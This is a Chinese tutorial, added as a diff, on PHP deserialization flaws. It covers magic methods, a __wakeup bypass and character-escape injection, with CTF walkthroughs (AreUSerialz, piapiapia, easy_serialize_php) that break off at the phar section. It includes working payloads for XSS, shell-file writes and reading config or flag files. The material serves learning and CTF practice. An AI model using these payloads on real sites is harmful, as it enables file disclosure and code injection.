@@ -1,0 +1,934 @@
+# 0x01.前言
+
+花些时间把四种常见的php反序列化总结了一遍，各自都找了简单示例和ctf例题，参考了一些师傅的链接加上自己的理解，如果有什么错误，请师傅们多多指点，参考链接放在文末
+
+# 0x02.反序列化是什么
+
+说到反序列化，经常会想到serialize()，unserialize()这两个函数。  
+我看到了一篇文章，文章引用我会写在文末，他先通过json_encode()和json_decode()两个函数帮助理解，虽然和反序列化没什么关系，但是确实对我理解反序列化有帮助的  
+先看看文档是如何描述的![](./img/9218031103559481243.png)  
+上实例![](./img/4240756469002432806.png)  
+json_encode()这个函数帮助我们将这个数组序列化成一串字符串  
+所以在这里，我们将数组序列化成json格式的字串的目的就是为了方便传输。我们可以看见，这里json格式来保存数据主要是使用键值对的形式。
+
+到这里就差不多了，如果说上面的json_encode函数是将数组转化成json格式的字符串，那么我们来看序列号和反序列化就是一个对象序列化成一串字符串，但仅保留对象里的成员变量，不保留函数方法
+
+看看例子  
+![](./img/7546569593146681089.png)  
+序列化结果为：  
+O:6:"class1":3:{s:1:"a";s:1:"1";s:4:"
+_b";s:5:"ThisB";s:9:"class1c";s:5:"ThisC";}  
+对象序列化后的结构为：  
+O:对象名的长度:"对象名":对象属性个数:{s:属性名的长度:"属性名";s:属性值的长度:"属性值";}  
+a是public类型的变量，s表示字符串，1表示变量名的长度，a是变量名。  
+b是protected类型的变量，它的变量名长度为4，也就是b前添加了%00_%00。所以，protected属性的表示方式是在变量名前加上%00*%00。  
+c是private类型的变量，c的变量名前添加了%00类名%00。所以，private属性的表示方式是在变量名前加上%00类名%00。  
+虽然Test类中有test1方法，但是，序列化得到的字符串中，只保存了公有变量a，保护变量b和私有变量c，并没保存类中的方法。也可以看出，序列化不保存方法。
+
+试试反序列化  
+![](./img/5104822343480513187.png)  
+echo和var_dump只能输出$test1->a，私有变量和protected变量都不可以  
+![](./img/1850939454347934960.png)  
+![](./img/3824377234850028867.png)
+
+# 0x03.漏洞产生原理
+
+反序列化漏洞产生的原因我个人总结就是反序列化处的参数用户可控，服务器接收我们序列化后的字符串并且未经过滤把其中的变量放入一些魔术方法里面执行，这就很容易产生漏洞。
+
+#### 那魔术方法是什么呢
+
+魔术方法命名是以符号 **开头的，比如** construct, **destruct,** toString, **sleep,**
+wakeup等等。这些函数在某些情况下会自动调用。
+
+  * __construct():具有构造函数的类会在每次创建新对象时先调用此方法。
+  * __destruct():析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。
+  * __toString()方法用于一个类被当成字符串时应怎样回应。例如echo $obj;应该显示些什么。 此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。 
+  * __sleep()方法在一个对象被序列化之前调用；
+  * __wakeup():unserialize( )会检查是否存在一个_wakeup( )方法。如果存在，则会先调用_wakeup方法，预先准备对象需要的资源。
+  * **get(),** set() 当调用或设置一个类及其父类方法中未定义的属性时
+  * __invoke() 调用函数的方式调用一个对象时的回应方法
+  * **call 和** callStatic前者是调用类不存在的方法时执行，而后者是调用类不存在的静态方式方法时执行。
+
+这里通过一个实例有助于理解这几个魔术方法的执行顺序  
+![](./img/2259747723282140524.png)
+
+# 0x04.漏洞实例
+
+## 1.反序列化简单入门实例
+
+    
+    
+    <?php 
+    class A{
+        var $test = "demo"; 
+        function __destruct(){
+            echo $this->test;
+        } 
+    } 
+    $a = $_GET['test']; 
+    $a_unser = unserialize($a);
+    ?>
+
+这里我们只要构造payload：[http://127.0.0.1/test.php?test=O:1:"A":1:{s:4:"test";s:5:"hello";}](http://127.0.0.1/test.php?test=O:1:)  
+就能够实现控制echo输出的变量，完成一个反射型xss
+
+![](./img/530199073473932816.png)![](./img/5696619489213537176.png)
+
+### 这里我重新写个例子来整理一下序列化的执行过程
+
+    
+    
+    <?php
+    class A
+    {
+        var $a = "a";
+        var $b = "b\r\n";
+    
+        function __construct()
+        {
+            $this->a = "123";
+            echo "初始化时调用\r\n";
+        }
+    
+        function __destruct()
+        {
+            echo "销毁时调用--";
+            echo $this->a . "\r\n";
+        }
+    }
+    $b = new A();
+    #$ser serialize($b);
+    #echo $ser;
+    $ser_test = 'O:1:"A":1:{s:1:"a";s:4:"test";}';
+    $unser = unserialize($ser_test);
+    echo $b->b;
+    ?>
+
+通过debug以及团队师傅的解惑后我才把代码运行过程捋清楚了，先放出输出结果![](./img/5734779853776072748.png)  
+这里先把A类实例化为$b，触发了构造函数__construct()，打印了初始化时调用，顺便把$a设置成123  
+接着运行，这里的反序列化不会有任何输出，以为他没有调用构造函数也没销毁，但是生成了一个A类的反序列化对象。（为什么序列化对象生成没有触发构造函数）  
+最后会走到echo $b->b这里，输出此时实例化的对象$b->b的值，也就是b  
+然后脚本结束，先销毁反序列化对象unser，输出销毁时调用，此时反序列化对象的$a是test，接着销毁实例化对象$b，也是同理。
+
+## 2.wakeup绕过
+
+### CVE-2016-7124
+
+    
+    
+    <?php
+    class A{
+        var $target = "test";
+        function __wakeup(){
+            $this->target = "wakeup!";
+        }
+        function __destruct(){
+            $fp = fopen("C:\\phpstudy_pro\\WWW\\unserialize\\shell.php","w");
+            fputs($fp,$this->target);
+            fclose($fp);
+        }
+    }
+    
+    $test = $_GET['test'];
+    $test_unseria = unserialize($test);
+    
+    echo "shell.php<br/>";
+    include(".\shell.php");
+    ?>
+
+代码正常的执行逻辑，应该是：unserialize( )会检查是否存在一个_wakeup(
+)方法。本例中存在，则会先调用_wakeup()方法，预先将对象中的target属性赋值为"wakeup!"。注意，不管用户传入的序列化字符串中的target属性为何值，
+**wakeup()都会把$target的值重置为"wakeup!"。最后程序运行结束，对象被销毁，调用**
+destruct()方法，将target变量的值写入文件shell.php中。这样shell.php文件中的内容就是字符串"wakeup"。  
+下面是一道这个知识点的ctf题目
+
+### 3.[网鼎杯 2020 青龙组]AreUSerialz
+
+![](./img/8764743563880675257.png)  
+![](./img/4962428439854812996.png)  
+先来理解一下源码：  
+这里先判断存不存在str传参，存在的话先拿去is_valid函数过滤一下，这里is_valid函数的作用是检查一下str字符串里面有没有存在不可打印的字符。ord函数是打印第一个字符的ASCII码必须在32到125之间
+
+然后进入反序列化，这里反序列化后生成一个序列化对象，但是不触发任何函数，然后进程结束，序列化对象销毁，触发__destruct()，判断op值如果强等于“2”则把op重置为“1”，注意这里的“2”是字符串，然后把content置空，执行process()函数，进入process()函数后先判断op，op等于“1”进入write函数，op等于“2”进入read函数（write函数实现一个文件写入的功能，read函数实现一个文件读取的功能）
+
+这里我们需要进入read函数读取flag，所以需要让进入process()函数的op值为2，但是我们从一开始传入op为“2”时，在进入process()函数之前会在destruct()被重置为1，所以我们需要绕过这个重置1
+
+这里我们用到了强等于和弱等于，这里的destruct函数是===“2”，在process()函数里面是==“2”  
+数字2不强等于字符串2，但是数字2弱等于字符串2，所以我们可以op设置为数字2，在destruct函数时2不强等于“2”,所以op不会被重置，进入process()函数后op值2弱等于“2”，所以进入read函数进行读取flag.php
+
+所以构造poc生成序列化字符串![](./img/4303606886473082398.png)  
+这是我以前最搞不明白的地方，通过前面的总结已经可以自己写出poc了哈哈哈，这里我写写我对写poc的理解：  
+因为我们需要传入一个FileHandler类的序列化对象，让FileHandler类的函数执行我们序列化对象中的变量  
+，而序列化只会保存类对象的变量，不会保存方法，所以我们只需构造这个FileHandler类的变量，将他序列化，这些变量将会在他反序列化的时候执行的魔术方法被使用，绕过魔术方法内有可利用函数，则存在反序列化漏洞  
+这里我们只需把三个参数的值写入然后序列化这个类即可，然后把得到的payload传入靶场进行文件读取获取flag![](./img/2612172509201431052.png)
+
+## 3.PHP反序列化字符逃逸详解
+
+### 前置知识：
+
+特点1：php在反序列化时，底层代码是以 ; 作为字段的分隔，以 } 作为结尾，并且是根据长度判断内容的
+，同时反序列化的过程中必须严格按照序列化规则才能成功实现反序列化
+，超出的部分并不会被反序列化成功，这说明反序列化的过程是有一定识别范围的，在这个范围之外的字符都会被忽略，不影响反序列化的正常进行。而且可以看到反序列化字符串都是以
+** _";}_** 结束的，那如果把 ** _";}_**
+添入到需要反序列化的字符串中（除了结尾处），就能让反序列化提前闭合结束，后面的内容就相应的丢弃了。  
+特点2：长度不对应会报错
+
+漏洞产生：反序列化之所以存在字符逃逸，最主要的原因是代码中存在针对序列化（serialize()）后的字符串进行了过滤操作（变多或者变少）。
+
+漏洞常见条件：序列化后过滤再去反序列化
+
+### 一、替换修改后导致序列化字符串变长
+
+示例代码：
+
+    
+    
+    <?php
+    function filter($str)
+    {
+        return str_replace('bb', 'ccc', $str);
+    }
+    class A
+    {
+            public $name = 'aaaa';
+            public $pass = '123456';
+    }
+    $AA = new A();
+    echo serialize($AA) . "\n";
+    $res = filter(serialize($AA));
+    echo $res."\n";
+    $c=unserialize($res);
+    var_dump($c);
+    ?>
+
+![](./img/2898057856797035752.png)  
+这里我们的目的就是间接通过反序列化改变pass的值  
+我们先理解代码执行顺序，这里是先序列化，然后再用序列化完的字符串进行过滤  
+所以当name的值为aaaabb的时候，过滤完name的值是aaaaccc，七个字符，但是序列化字符串依然认为name的值是6个，所以根据上面前置知识的特性二，这里反序列化失败，var_dump($c)的结果是bool(false)  
+![](./img/4716513165680364811.png)  
+但是我们可以利用特性一去闭合，当我们让name的值为";s:4:"pass";s:6:"hacker";}  
+![](./img/3085242758515695568.png)  
+首先我们要记得要满足特性一和特性二才能反序列化成功！！！  
+我们来看生成的字符串O:1:"A":2:{s:4:"name";s:27:"";s:4:"pass";s:6:"hacker";}";s:4:"pass";s:6:"123456";}（这里需要理解生成的序列化字符串各个含义，前文有解释）  
+为什么现在生成的序列化字符串还能反序列化成功呢？因为我们的name的值现在认为我们有27个字符串，但是现在![](./img/4838255255394205152.png)(箭头处)是空的，所以name只能认为
+** _";s:4:"pass";s:6:"hacker";}_**
+当作了name的值，这个序列化字符串才能成功反序列化。所以我们的pass的值还是输出了123456.但是我们是想把 **
+_";s:4:"pass";s:6:"hacker";}_** 当作序列化字符串里面的一部分去执行,让pass变成hacker。  
+所以我们利用到了fileter函数，这个过滤函数看似想增加代码的安全性，实际上是增加了代码的危险性。  
+可以看到 ** _";s:4:"pass";s:6:"hacker";}_** 是27个字符串，所以我们使name的值为 **
+_bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";s:4:"pass";s:6:"hacker";}_**
+,来分析这27个bb，经过第一步序列化后为 **
+_O:1:"A":2:{s:4:"name";s:81:"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";s:4:"pass";s:6:"hacker";}";s:4:"pass";s:6:"123456";}_**  
+首先这里name的值的字符串数字为81，然后看到filter函数过滤后为 **
+_O:1:"A":2:{s:4:"name";s:81:"ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc";s:4:"pass";s:6:"hacker";}";s:4:"pass";s:6:"123456";}_**  
+变成了81个c，刚好就是原来让name的字符串个数81正确，而且;}可以在hacker后面闭合（图中箭头所指的;}），这符合了前置知识里面的两个特性，可以成功执行，然后后面的";s:4:"pass";s:6:"123456";}就可以废弃了，这便实现了间接修改了pass的值  
+注：再解释一下我觉得这里我最开始的时候也很难理解，这里序列化后bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";s:4:"pass";s:6:"hacker";}是name的值，81个值  
+经过filter函数过滤后，前54个c就相当于54个b，多出来的27个字符c，把27个字符 **
+_";s:4:"pass";s:6:"hacker";}_** 顶到后面了，到这里序列化语句就因为 ** _;}_**
+截止了，且name的字符串数81为81个c，符合特性二，可以反序列化成功。后面 ** _";s:4:"pass";s:6:"123456";}_**
+被顶出去废弃了  
+![](./img/5541688931458833198.png)  
+总结思路：  
+这里其实就是利用了filter函数可以替换增加字符串，每增加一个bb，在过滤函数filter替换之后会多一个字符串，我们需要构造的payload **
+_";s:4:"pass";s:6:"hacker";}_**
+是27个字符串，所以我们加上27个bb是为了多出27个字符![](./img/5043256651008903569.png)
+
+### 字符串增加的例题：[0CTF 2016]piapiapia
+
+这里为了讲反序列化的字符逃逸问题所以跳过做题思路，直接访问www.zip下载源码审![](./img/3593958722264282626.png)
+
+#### 看看代码
+
+index.php
+
+    
+    
+    <?php
+        require_once('class.php');
+        if($_SESSION['username']) {
+            header('Location: profile.php');
+            exit;
+        }
+        if($_POST['username'] && $_POST['password']) {
+            $username = $_POST['username'];
+            $password = $_POST['password'];
+    
+            if(strlen($username) < 3 or strlen($username) > 16) 
+                die('Invalid user name');
+    
+            if(strlen($password) < 3 or strlen($password) > 16) 
+                die('Invalid password');
+    
+            if($user->login($username, $password)) {
+                $_SESSION['username'] = $username;
+                header('Location: profile.php');
+                exit;   
+            }
+            else {
+                die('Invalid user name or password');
+            }
+        }
+        else {
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+       <title>Login</title>
+       <link href="static/bootstrap.min.css" rel="stylesheet">
+       <script src="static/jquery.min.js"></script>
+       <script src="static/bootstrap.min.js"></script>
+    </head>
+    <body>
+        <div class="container" style="margin-top:100px">  
+            <form action="index.php" method="post" class="well" style="width:220px;margin:0px auto;"> 
+                <img src="static/piapiapia.gif" class="img-memeda " style="width:180px;margin:0px auto;">
+                <h3>Login</h3>
+                <label>Username:</label>
+                <input type="text" name="username" style="height:30px"class="span3"/>
+                <label>Password:</label>
+                <input type="password" name="password" style="height:30px" class="span3">
+    
+                <button type="submit" class="btn btn-primary">LOGIN</button>
+            </form>
+        </div>
+    </body>
+    </html>
+    <?php
+        }
+    ?>
+
+这里用于验证账号密码正确后，跳转到profile.php页面
+
+profile.php：
+
+    
+    
+    <?php
+        require_once('class.php');
+        if($_SESSION['username'] == null) {
+            die('Login First'); 
+        }
+        $username = $_SESSION['username'];
+        $profile=$user->show_profile($username);
+        if($profile  == null) {
+            header('Location: update.php');
+        }
+        else {
+            $profile = unserialize($profile);
+            $phone = $profile['phone'];
+            $email = $profile['email'];
+            $nickname = $profile['nickname'];
+            $photo = base64_encode(file_get_contents($profile['photo']));
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+       <title>Profile</title>
+       <link href="static/bootstrap.min.css" rel="stylesheet">
+       <script src="static/jquery.min.js"></script>
+       <script src="static/bootstrap.min.js"></script>
+    </head>
+    <body>
+        <div class="container" style="margin-top:100px">  
+            <img src="data:image/gif;base64,<?php echo $photo; ?>" class="img-memeda " style="width:180px;margin:0px auto;">
+            <h3>Hi <?php echo $nickname;?></h3>
+            <label>Phone: <?php echo $phone;?></label>
+            <label>Email: <?php echo $email;?></label>
+        </div>
+    </body>
+    </html>
+    <?php
+        }
+    ?>
+
+看到涉及了反序列化函数unserialize()，反序列化的几个变量是上传文件处几个参数  
+第一行代码就包含了class.php，也拿出来看看
+
+    
+    
+    <?php
+    require('config.php');
+    
+    class user extends mysql{
+        private $table = 'users';
+    
+        public function is_exists($username) {
+            $username = parent::filter($username);
+    
+            $where = "username = '$username'";
+            return parent::select($this->table, $where);
+        }
+        public function register($username, $password) {
+            $username = parent::filter($username);
+            $password = parent::filter($password);
+    
+            $key_list = Array('username', 'password');
+            $value_list = Array($username, md5($password));
+            return parent::insert($this->table, $key_list, $value_list);
+        }
+        public function login($username, $password) {
+            $username = parent::filter($username);
+            $password = parent::filter($password);
+    
+            $where = "username = '$username'";
+            $object = parent::select($this->table, $where);
+            if ($object && $object->password === md5($password)) {
+                return true;
+            } else {
+                return false;
+            }
+        }
+        public function show_profile($username) {
+            $username = parent::filter($username);
+    
+            $where = "username = '$username'";
+            $object = parent::select($this->table, $where);
+            return $object->profile;
+        }
+        public function update_profile($username, $new_profile) {
+            $username = parent::filter($username);
+            $new_profile = parent::filter($new_profile);
+    
+            $where = "username = '$username'";
+            return parent::update($this->table, 'profile', $new_profile, $where);
+        }
+        public function __tostring() {
+            return __class__;
+        }
+    }
+    
+    class mysql {
+        private $link = null;
+    
+        public function connect($config) {
+            $this->link = mysql_connect(
+                $config['hostname'],
+                $config['username'], 
+                $config['password']
+            );
+            mysql_select_db($config['database']);
+            mysql_query("SET sql_mode='strict_all_tables'");
+    
+            return $this->link;
+        }
+    
+        public function select($table, $where, $ret = '*') {
+            $sql = "SELECT $ret FROM $table WHERE $where";
+            $result = mysql_query($sql, $this->link);
+            return mysql_fetch_object($result);
+        }
+    
+        public function insert($table, $key_list, $value_list) {
+            $key = implode(',', $key_list);
+            $value = '\'' . implode('\',\'', $value_list) . '\''; 
+            $sql = "INSERT INTO $table ($key) VALUES ($value)";
+            return mysql_query($sql);
+        }
+    
+        public function update($table, $key, $value, $where) {
+            $sql = "UPDATE $table SET $key = '$value' WHERE $where";
+            return mysql_query($sql);
+        }
+    
+        public function filter($string) {
+            $escape = array('\'', '\\\\');
+            $escape = '/' . implode('|', $escape) . '/';
+            $string = preg_replace($escape, '_', $string);
+    
+            $safe = array('select', 'insert', 'update', 'delete', 'where');
+            $safe = '/' . implode('|', $safe) . '/i';
+            return preg_replace($safe, 'hacker', $string);
+        }
+        public function __tostring() {
+            return __class__;
+        }
+    }
+    session_start();
+    $user = new user();
+    $user->connect($config);
+
+update.php
+
+    
+    
+    <?php
+        require_once('class.php');
+        if($_SESSION['username'] == null) {
+            die('Login First'); 
+        }
+        if($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {
+    
+            $username = $_SESSION['username'];
+            if(!preg_match('/^\d{11}$/', $_POST['phone']))
+                die('Invalid phone');
+    
+            if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))
+                die('Invalid email');
+    
+            if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
+                die('Invalid nickname');
+    
+            $file = $_FILES['photo'];
+            if($file['size'] < 5 or $file['size'] > 1000000)
+                die('Photo size error');
+    
+            move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));
+            $profile['phone'] = $_POST['phone'];
+            $profile['email'] = $_POST['email'];
+            $profile['nickname'] = $_POST['nickname'];
+            $profile['photo'] = 'upload/' . md5($file['name']);
+    
+            $user->update_profile($username, serialize($profile));
+            echo 'Update Profile Success!<a href="profile.php">Your Profile</a>';
+        }
+        else {
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+       <title>UPDATE</title>
+       <link href="static/bootstrap.min.css" rel="stylesheet">
+       <script src="static/jquery.min.js"></script>
+       <script src="static/bootstrap.min.js"></script>
+    </head>
+    <body>
+        <div class="container" style="margin-top:100px">  
+            <form action="update.php" method="post" enctype="multipart/form-data" class="well" style="width:220px;margin:0px auto;"> 
+                <img src="static/piapiapia.gif" class="img-memeda " style="width:180px;margin:0px auto;">
+                <h3>Please Update Your Profile</h3>
+                <label>Phone:</label>
+                <input type="text" name="phone" style="height:30px"class="span3"/>
+                <label>Email:</label>
+                <input type="text" name="email" style="height:30px"class="span3"/>
+                <label>Nickname:</label>
+                <input type="text" name="nickname" style="height:30px" class="span3">
+                <label for="file">Photo:</label>
+                <input type="file" name="photo" style="height:30px"class="span3"/>
+                <button type="submit" class="btn btn-primary">UPDATE</button>
+            </form>
+        </div>
+    </body>
+    </html>
+    <?php
+        }
+    ?>
+
+填写信息后将信息序列化并过滤
+
+config.php
+
+    
+    
+    <?php
+        $config['hostname'] = '127.0.0.1';
+        $config['username'] = 'root';
+        $config['password'] = '';
+        $config['database'] = '';
+        $flag = '';
+    ?>
+
+可以看到flag在这个文件  
+看完代码后看看页面，有助于理解![](./img/2670271786303263242.png)![](./img/4768735814667378402.png)
+
+#### 开始审计
+
+代码逻辑都看完后，扔seay自动审计看看![](./img/6702060314163561456.png)  
+总结出三处危险函数利用，profile.php处的unserialize和file_get_contents和update.php的serialize  
+可以看到这里将变量$profile['photo']中的内容（也就是上传的文件）读取后进行base64编码，我们全局搜索一下这个变量![](./img/4822492135847370539.png)  
+![](./img/5957744954454330968.png)  
+看到变量$profile['photo']是文件上传控制的但是被经过md5加密了，没办法直接传，结合反序列化函数和前面看到的filter的那些正则匹配替换函数，我们可以试着尝试反序列化的字符逃逸。  
+先反过来跟踪传输变量$profile的方法update_profile（）![](./img/1131174848494117413.png)  
+这里看到经过过滤后调用update（）更新数据，跟踪update（）![](./img/5401950384158811516.png)  
+update()函数是把$profile变量更新放入数据库，到这里追踪就断了  
+上面是从后往前推，下面是从前往后推  
+看一下别人的文章，发现可以追踪一下$profile变量![](./img/4244763150214847839.png)  
+profile.php![](./img/7596605766463996997.png)  
+可以看到$profile变量是$user的show_profile函数传过来的，跟进去class.php下，user类里面![](./img/969320036941994417.png)  
+user类继承了mysql类，这里先调用了父类的filter函数。这里是替换字符串中的单引号和反斜杠为下划线
+，并且替换多个字符串为hacker。implode函数是表示把数组拼接起来，拼接符是
+“|”：![](./img/7614859417745135655.png)  
+然后show_profile里面又调用了父类的select函数![](./img/5021584124889731010.png)  
+看到这里的数据库操作就可以和前面断了的链连接起来了  
+调用链从后往前推为：update.php接收传参->update_profile()->class.php的update()->数据库操作->class.php的select()->show_profile()->profile.php的file_get_contents()  
+思路：在update.php接收上传文件传参，然后在update_profile()里面执行序列化函数和过滤函数以及update()更新数据库，接着show_profile()通过parent::select()取到$profile变量，并把$object-<profile变量return返回，最后返回的$object-<profile变量在profile.php被赋值给$profile之后反序列化并放到file_get_contents()读取文件
+
+整理好思路后看到序列化函数，反序列化以及过滤函数就可以联系到字符逃逸了。  
+现在我们需要让file_get_contents()读取config.php，但是变量$profile['photo']被经过md5加密了，没办法直接传，我们看上他的上一个参数nickname，因为这里是序列化之后再经过filter函数替换过滤，我这也是字符逃逸的一个关键条件  
+![](./img/4198371705982956854.png)  
+绕过：  
+先看看两个过滤处，一个是preg_replace替换函数，一个是正则匹配函数  
+第一处preg_replace替换：  
+![](./img/5088151695987842002.png)  
+这里可以看到把select，insert，update等字符串替换成hacker，其他都是6个字符串，和hacker一样，并不能让字符串增多，但这里有一个where是五个字符串，替换成hacker后相当于多了一个字符串，如果我们多写几个where，就能多出多个字符串，多出来的字符串可以构造语句形成字符逃逸。  
+第二处正则匹配函数：  
+![](./img/1530244060985756167.png)  
+这里先对它进行了正则，这个正则的意思是匹配除了a-zA-Z0-9_之外的字符,因为 “^” 符号是在 “[]”
+里面，所以是非的意思，不是开始的意思，preg_match只能处理字符串，当传入的subject是数组时会返回false，所以我们传入数组可以绕过  
+注：这里传数组的payload，闭合就和直接传字符串不一样，上面简单示例的payload是 **
+_";s:4:"pass";s:6:"hacker";}_** 而这里数组的payload是 **
+_";}s:5:"photo";s:10:"config.php";}_**  
+![](./img/8034798716944288167.png)  
+![](./img/6697322772203649690.png)  
+可以看到数组的payload才能闭合，这里可以看到需要34个字符闭合在箭头处，实现字符逃逸，所以我们利用正则替换函数，用34个where替换hacker，就会多出34个字符串，从而实现字符逃逸，  
+所以我们这里的最终payload为：  
+wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}
+
+#### 实际利用
+
+![](./img/6030693893624193089.png)  
+注册个账户登入来到上传文件处![](./img/1565166764042845104.png)  
+抓包修改nickname[]和内容![](./img/1332524218612547736.png)  
+成功拿到flag  
+![](./img/6932750172360391081.png)
+
+### 二、替换之后导致序列化字符串变短
+
+简单示例代码：
+
+    
+    
+    <?php
+    function str_rep($string){
+        return preg_replace( '/php|test/','', $string);
+    }
+    
+    $test['name'] = $_GET['name'];
+    $test['sign'] = $_GET['sign']; 
+    $test['number'] = '2020';
+    $temp = str_rep(serialize($test));
+    printf($temp);
+    $fake = unserialize($temp);
+    echo '<br>';
+    print("name:".$fake['name'].'<br>');
+    print("sign:".$fake['sign'].'<br>');
+    print("number:".$fake['number'].'<br>');
+    ?>
+
+这段代码是接收了参数name和sign，且number是固定的，经过了序列化=>正则匹配替换字符串减少=>反序列化的过程后输出结果，我们的目的就是通过控制传参name和sign，间接改变number  
+我们继续像上文一样构造在sign中传 ** _";s:6:"number";s:4:"2000";}_** 看看闭合  
+![](./img/3011162163916155748.png)  
+这样子直接加入显然是不行的，由于sign的字符串个数为27，所以后面横线处的payload被当作了字符串sign的值，而没有被当作序列化语句去反序列化，所以我们还是需要过滤函数了给我们实现字符逃逸  
+构造payload：?name=testtesttesttesttesttest&sign=hello";s:4:"sign";s:4:"eval";s:6:"number";s:4:"2000";}  
+![](./img/8103948094168049313.png)  
+修改了一下代码使其输出序列化后的字符串和过滤后的字符串，可以看到整个payload成功改变了number的数值，原理其实和上面字符串增多的原理是大同小异的，经过过滤后第一个横线处被当作name的值，第二处横线则被当作序列化语句执行了所以成功修改了num值，并闭合完成，第三处横线则被顶出，废弃了。
+
+注：虽然看文章直接用payload的可以理解，但是我在思考如果遇到这种题目我自己应该如何构造payload，我怎么知道放入几个test？  
+构造payload思路：首先我们想让number的值改变，可以构造 **
+_";s:4:"sign";s:4:"eval";s:6:"number";s:4:"2000";}_**
+这里我们需要构造的序列化语句有两个值，sign和number，因为我们的传参是放在sign参数里面，所以需要构造一个正常的sign。(这里的闭合和字符串增多的格式是一样的)  
+来看一下过滤后的payload：a:3:{s:4:"name";s:24:"";s:4:"sign";s:54:"hello";s:4:"sign";s:4:"eval";s:6:"number";s:4:"2000";}";s:6:"number";s:4:"2020";}  
+红字部分就是我们需要放入的test的个数，红字部分有24个字符串（也就是name的值），所以我们需要放入24个test  
+其实这里的hello是来凑的，hello换成o也可以，只要是4的倍数，因为test是4个字符串，相对应的test也要减少一个  
+![](./img/8107679311602623256.png)  
+这里给出代码大家意会一下，test个数其实也就是name的值的字符串个数
+
+#### 与字符串增加的区别：
+
+1、字符串增加：构造的序列化语句和过滤的值（bbbbbb）在同一个变量  
+字符串减少：构造的序列化语句和过滤的值不在同个变量里  
+2、字符串增加：构造过滤的值（bbbbbbb）的个数就是构造的序列化语句的字符串个数 ** _";s:4:"pass";s:6:"hacker";}_**  
+字符串减少：构造过滤的值是name的值的个数![](./img/8205467936872176033.png)
+
+### [安洵杯 2019]easy_serialize_php
+
+![](./img/6126882387694757883.png)  
+理解一下代码：  
+先接收一个f的GET传参  
+filter函数是过滤函数，正则匹配替换字符串，字符逃逸的条件之一  
+extract() 函数从数组中将变量导入到当前的符号表(本题的作用是将_SESSION的两个函数变为post传参)  
+这里本来有点疑惑，本地搭建试了一下（也是因为他才存在变量覆盖漏洞，我们才有两个可控参数）  
+![](./img/6470844189239863478.png)![](./img/6623983587794298752.png)  
+看到传phpinfo提示可能有一些东西，进去看看  
+![](./img/7476143617562487210.png)  
+很狗，搜flag搜不到，是f1ag，直接访问文件访问不到，接着看源码  
+看到最底下的file_get_contents文件读取函数，那就想办法读取他  
+![](./img/6854750140278025761.png)  
+当传参是show_image时，对$serialize_info变量进行反序列化并读取  
+到这就不难看出了是字符逃逸的题目，因为有序列化-》过滤-》反序列化，还有个文件读取函数  
+这里一共有两个参数可控，分别是_SESSION[user]和_SESSION[function]，读取的_SESSION[img]变量是不可控的，所以我们需要构造
+
+#### 键名逃逸
+
+过滤前：a:2:{s:7:"phpflag";s:48:";s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}  
+过滤后：a:2:{s:7:"";s:48:";s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}  
+我最开始疑惑为什么需要 ** _;s:1:"1_** 对比完发现过滤前键名是phpflag，键值是后面48个字符串  
+过滤后phpflag没了，键名就变成了 ** _";s:48:_** 但是后面我们构造的img键值对是需要被反序列化的，已经是一对了，键名 **
+_";s:48_** 它没有键值，所以我们应该给他一个键值 ** _;s:1:"1_** 键值名凑和 ** _";s:48:_**
+一样七个字符就好了，所以我们应该构造payload：_SESSION[flagphp]=;s:1:"1";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}  
+![](./img/2311228119257497329.png)  
+看到提示我们新路径flag在/d0g3_fllllllag，将/d0g3_fllllllag去base64加密得到，L2QwZzNfZmxsbGxsbGFn  
+![](./img/3799988756645268041.png)
+
+#### 键值逃逸
+
+这个就是上面简单示例的类型了  
+payload：_SESSION[user]=flagflagflagflagflagflag&_SESSION[function]=a";s:8:"function";s:4:"eval";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}  
+![](./img/6350850519576110807.png)  
+再说一次构造poc思路： ** _";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}_**
+先构造img的值，然后我们这里我们需要用到两个可控参数user和function，键名逃逸一个就可以了但键值逃逸需要两个，这里的user是用来传过滤字符，function参数也需要构造，这个与上面简单示例同理![](./img/6771951874651918502.png)  
+所以payload：a";s:8:"function";s:4:"eval";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}  
+这里不懂为什么有个a可以参考上面简单示例构造poc思路  
+过滤前：a:2:{s:4:"user";s:24:"flagflagflagflagflagflag";s:8:"function";s:65:"a";s:8:"function";s:4:"eval";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"  
+过滤后：a:2:{s:4:"user";s:24:"";s:8:"function";s:65:"a";s:8:"function";s:4:"eval";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
+
+## 4.phar反序列化
+
+### [CISCN2019 华北赛区 Day1 Web1]Dropbox
+
+进入题目后是一个登录框，可以注册，所以先注册进去看看先不试试注入  
+![](./img/3447797730893012551.png)  
+可以看到有上传文件和文件删除文件下载功能，自然就试试能不能文件下载flag文件，但是读不到，可以读index.php文件试试，结果index.php的提示读出下面三个文件，大概就只需要这三个文件，其他就不截图了  
+![](./img/6694282275139349342.png)![](./img/9143902194809068942.png)![](./img/7221463074128115616.png)![](./img/8762264952007397510.png)  
+![](./img/3857937962827078920.png)  
